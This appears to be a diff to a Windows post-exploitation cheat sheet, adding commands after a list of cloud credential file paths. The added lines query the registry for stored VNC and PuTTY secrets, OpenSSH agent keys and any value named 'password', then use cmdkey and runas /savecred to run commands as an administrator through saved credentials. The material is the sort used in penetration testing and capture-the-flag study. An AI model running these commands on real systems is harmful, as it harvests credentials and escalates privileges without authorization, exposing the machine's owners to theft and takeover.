@@ -15,3 +15,17 @@ SiteList.xml
 gcloud\credentials.db
 gcloud\legacy_credentials
 gcloud\access_tokens.db
+
+reg query "HKCU\Software\ORL\WinVNC3\Password"
+reg query "HKCU\Software\TightVNC\Server"
+reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
+reg query "HKCU\Software\OpenSSH\Agent\Keys"
+reg query HKLM /f password /t REG_SZ /s
+reg query HKCU /f password /t REG_SZ /s
+
+cmdkey /list -> check for admin if it has cred save then run-->
+--> runas /savecred /user:admin cmd.exe (the low user has to have Mandatory Label\Medium Mandatory Level)
+# run a command as runas:
+runas /savecred /user:admin "C:\Windows\System32\cmd.exe /c dir /b /a /s C:\ > c:\where\you\can\write\to"
+
+
